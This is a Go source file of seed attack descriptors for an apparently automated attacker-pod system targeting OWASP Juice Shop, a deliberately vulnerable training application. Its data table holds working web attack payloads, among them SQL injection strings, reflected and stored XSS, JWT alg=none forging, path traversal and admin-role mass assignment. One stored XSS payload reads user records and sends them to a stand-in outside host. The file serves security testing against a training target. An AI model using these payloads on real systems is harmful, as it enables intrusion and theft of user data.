// Package attacks holds the Go-side genome catalog and mutation helper data
// (seed genomes, technique lists, target-path lists). These are data tables,
// not literal ports of the legacy Python attack scripts.
package attacks

// Genome is the attack-vector descriptor handed to each attacker pod via
// the GENOME env var. Field names mirror data_contracts.genome_schema in
// PRD.json.
type Genome struct {
	Vector       string         `json:"vector"`
	Category     string         `json:"category"`
	Technique    string         `json:"technique"`
	TargetPath   string         `json:"target_path"`
	Params       map[string]any `json:"params"`
	Hint         string         `json:"hint"`
	ParentPodID  string         `json:"parent_pod_id,omitempty"`
}

// SeedGenomes is the Generation-1 starter population for the OWASP Juice
// Shop target, mirroring evolution_loop.seed_genomes_for_generation_1 in
// PRD.json. Order is significant: when --population is less than the full
// list the control plane uses the first N entries deterministically, which
// keeps demo runs reproducible.
var SeedGenomes = []Genome{
	{
		Vector: "sqli_login", Category: "injection", Technique: "tautology",
		TargetPath: "/rest/user/login",
		Params:     map[string]any{"email_payload": "' OR 1=1--", "password": "x"},
		Hint:       "Try classic auth bypass via SQL tautology in email field.",
	},
	{
		Vector: "sqli_login_union", Category: "injection", Technique: "union_select",
		TargetPath: "/rest/user/login",
		Params:     map[string]any{"email_payload": "' UNION SELECT 1,2,3,4,5--"},
		Hint:       "Try UNION-based info leak.",
	},
	{
		Vector: "xss_search_reflected", Category: "xss", Technique: "reflected",
		TargetPath: "/#/search",
		Params:     map[string]any{"q": "<iframe src=javascript:alert(1)>"},
		Hint:       "Try reflected XSS via search query parameter.",
	},
	{
		Vector: "bola_users", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/api/Users/1",
		Params:     map[string]any{},
		Hint:       "Try fetching admin user by ID without auth.",
	},
	{
		Vector: "bola_baskets", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/rest/basket/1",
		Params:     map[string]any{},
		Hint:       "Try fetching another user's basket.",
	},
	{
		Vector: "jwt_alg_none", Category: "auth", Technique: "jwt_swap",
		TargetPath: "/rest/user/whoami",
		Params:     map[string]any{"forge_alg": "none"},
		Hint:       "Forge a JWT with alg=none claiming admin.",
	},
	{
		Vector: "path_traversal_ftp", Category: "data_exposure", Technique: "dotdot",
		TargetPath: "/ftp",
		Params:     map[string]any{"file": "../package.json.bak"},
		Hint:       "Try directory traversal in /ftp listing.",
	},
	{
		Vector: "data_exposure_pkgjson", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/ftp/package.json.bak",
		Params:     map[string]any{},
		Hint:       "Direct fetch of package.json backup.",
	},
	{
		Vector: "data_exposure_robots", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/robots.txt",
		Params:     map[string]any{},
		Hint:       "Read robots.txt for disallowed paths.",
	},
	{
		Vector: "admin_section", Category: "access_control", Technique: "force_browse",
		TargetPath: "/#/administration",
		Params:     map[string]any{},
		Hint:       "Try to reach admin UI directly.",
	},
	{
		Vector: "feedback_xss_stored", Category: "xss", Technique: "stored",
		TargetPath: "/api/Feedbacks",
		Params: map[string]any{
			"comment_payload": "<script>fetch('/api/Users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>",
		},
		Hint: "Try stored XSS in feedback comment field.",
	},
	{
		Vector: "register_admin_role", Category: "auth", Technique: "param_pollution",
		TargetPath: "/api/Users",
		Params: map[string]any{"body": map[string]any{
			"email": "z+<rand>@oz.dev", "password": "p", "role": "admin",
		}},
		Hint: "Mass-assign role=admin during registration.",
	},
	{
		Vector: "rest_products_search_sqli", Category: "injection", Technique: "error_based",
		TargetPath: "/rest/products/search",
		Params:     map[string]any{"q_payload": "')) UNION SELECT name,id,price,description,image,deluxePrice,createdAt,updatedAt,deletedAt FROM Users--"},
		Hint:       "Classic Juice Shop search SQLi for user table leak.",
	},
	{
		Vector: "captcha_bypass", Category: "validation", Technique: "skip_token",
		TargetPath: "/api/Feedbacks",
		Params:     map[string]any{"omit_captcha": true},
		Hint:       "Submit feedback without captcha token.",
	},
	{
		Vector: "score_board", Category: "data_exposure", Technique: "force_browse",
		TargetPath: "/#/score-board",
		Params:     map[string]any{},
		Hint:       "Find the hidden score-board route.",
	},
}

// PickSeedGenomes returns the first n genomes from SeedGenomes, wrapping
// modulo when n exceeds the list length. This keeps small-population demo
// runs deterministic while still letting larger runs cover all vectors.
func PickSeedGenomes(n int) []Genome {
	if n <= 0 {
		return nil
	}
	out := make([]Genome, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, SeedGenomes[i%len(SeedGenomes)])
	}
	return out
}
